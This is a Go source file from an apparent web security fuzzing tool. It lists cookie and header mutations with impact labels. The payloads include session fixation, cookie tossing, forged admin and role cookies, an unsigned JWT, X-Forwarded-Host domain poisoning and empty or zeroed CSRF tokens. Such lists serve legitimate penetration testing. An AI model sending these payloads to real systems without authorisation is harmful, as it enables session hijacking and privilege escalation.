package headers

import "github.com/cc1a2b/HHunter/engine"

func GetCookieMutations() []engine.Mutation {
	mutations := []engine.Mutation{}

	// Session fixation — inject known session IDs
	sessionFixation := []struct {
		value  string
		impact string
	}{
		{"PHPSESSID=attacker_controlled_session_id", "PHP session fixation"},
		{"JSESSIONID=attacker_controlled_session_id", "Java session fixation"},
		{"ASP.NET_SessionId=attacker_controlled_session_id", "ASP.NET session fixation"},
		{"session=attacker_controlled_session_id", "Generic session fixation"},
		{"connect.sid=s%3Aattacker_session.fake_signature", "Express session fixation"},
		{"_session_id=attacker_controlled_session_id", "Rails session fixation"},
		{"laravel_session=attacker_controlled_session_id", "Laravel session fixation"},
		{"CGISESSID=attacker_controlled_session_id", "CGI session fixation"},
		{"csrftoken=attacker_token; sessionid=attacker_session", "Django session + CSRF fixation"},
	}

	for _, sf := range sessionFixation {
		mutations = append(mutations, engine.Mutation{
			Header:   "Cookie",
			Value:    sf.value,
			Category: "Cookie",
			Impact:   "Session fixation: " + sf.impact,
		})
	}

	// Cookie tossing — subdomain cookie injection to override parent domain cookies
	cookieTossing := []struct {
		value  string
		impact string
	}{
		{"session=evil; Domain=.target.com; Path=/", "Cookie tossing — domain scope override"},
		{"admin=true; Domain=.target.com", "Cookie tossing — admin flag injection"},
		{"role=admin; Domain=.target.com; Path=/", "Cookie tossing — role injection"},
		{"auth=bypassed; Domain=.target.com; Secure", "Cookie tossing — auth bypass with Secure flag"},
	}

	for _, ct := range cookieTossing {
		mutations = append(mutations, engine.Mutation{
			Header:   "Cookie",
			Value:    ct.value,
			Category: "Cookie",
			Impact:   ct.impact,
		})
	}

	// Cookie overflow / jar overflow — force cookie eviction
	longValue := ""
	for i := 0; i < 100; i++ {
		longValue += "A"
	}
	cookieOverflow := []struct {
		value  string
		impact string
	}{
		// Many cookies to overflow the cookie jar
		{"a=1; b=2; c=3; d=4; e=5; f=6; g=7; h=8; i=9; j=10; k=11; l=12; m=13; n=14; o=15; p=16; q=17; r=18; s=19; t=20; u=21; v=22; w=23; x=24; y=25; z=26; aa=27; ab=28; ac=29; ad=30; ae=31; af=32; ag=33; ah=34; ai=35; aj=36; ak=37; al=38; am=39; an=40; ao=41; ap=42; aq=43; ar=44; as=45; at=46; au=47; av=48; aw=49; ax=50", "Cookie jar overflow — 50 cookies to evict existing session"},
		{"overflow=" + longValue + longValue + longValue + longValue + longValue, "Large cookie value — force truncation/eviction"},
	}

	for _, co := range cookieOverflow {
		mutations = append(mutations, engine.Mutation{
			Header:   "Cookie",
			Value:    co.value,
			Category: "Cookie",
			Impact:   co.impact,
		})
	}

	// Auth cookie manipulation
	authCookies := []struct {
		value  string
		impact string
	}{
		{"admin=1", "Admin flag in cookie"},
		{"admin=true", "Admin flag (boolean) in cookie"},
		{"is_admin=1; role=admin", "Combined admin flags"},
		{"user_id=1", "IDOR via cookie — user ID 1 (admin)"},
		{"user_id=0", "IDOR via cookie — user ID 0 (root)"},
		{"user=admin", "Username override in cookie"},
		{"authenticated=true", "Auth flag override"},
		{"logged_in=1; user_type=admin", "Login state + role override"},
		{"access_level=9999", "Privilege level override"},
		{"internal=true; debug=true", "Internal access + debug mode"},
		{"jwt=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.", "JWT alg:none in cookie"},
	}

	for _, ac := range authCookies {
		mutations = append(mutations, engine.Mutation{
			Header:   "Cookie",
			Value:    ac.value,
			Category: "Cookie",
			Impact:   "Auth cookie manipulation: " + ac.impact,
		})
	}

	// Cookie injection via other headers
	cookieInjectionHeaders := []struct {
		header string
		value  string
		impact string
	}{
		// Via Set-Cookie2 (obsolete but some servers honor)
		{"Cookie2", "$Version=1; session=attacker", "Cookie2 header session injection"},
		// Via X-Forwarded-* to influence Set-Cookie domain
		{"X-Forwarded-Host", "evil.com", "Cookie domain poisoning via X-Forwarded-Host"},
	}

	for _, ci := range cookieInjectionHeaders {
		mutations = append(mutations, engine.Mutation{
			Header:   ci.header,
			Value:    ci.value,
			Category: "Cookie",
			Impact:   ci.impact,
		})
	}

	// Cookie path traversal
	pathCookies := []struct {
		value  string
		impact string
	}{
		{"session=test; Path=/admin", "Cookie scoped to /admin path"},
		{"session=test; Path=/../", "Cookie path traversal"},
		{"session=test; Path=/; HttpOnly", "Cookie with HttpOnly flag test"},
		{"session=test; Path=/; Secure; SameSite=None", "Cookie with SameSite=None"},
	}

	for _, pc := range pathCookies {
		mutations = append(mutations, engine.Mutation{
			Header:   "Cookie",
			Value:    pc.value,
			Category: "Cookie",
			Impact:   "Cookie path/attribute manipulation: " + pc.impact,
		})
	}

	// CSRF token manipulation via cookie
	csrfCookies := []struct {
		value  string
		impact string
	}{
		{"csrf_token=; _csrf=", "Empty CSRF tokens"},
		{"_token=null; csrf=null", "Null CSRF tokens"},
		{"csrftoken=0000000000000000000000000000000000000000", "Zeroed CSRF token"},
		{"X-CSRF-TOKEN=attacker_token", "CSRF token override via cookie name"},
	}

	for _, cc := range csrfCookies {
		mutations = append(mutations, engine.Mutation{
			Header:   "Cookie",
			Value:    cc.value,
			Category: "Cookie",
			Impact:   "CSRF token manipulation: " + cc.impact,
		})
	}

	return mutations
}
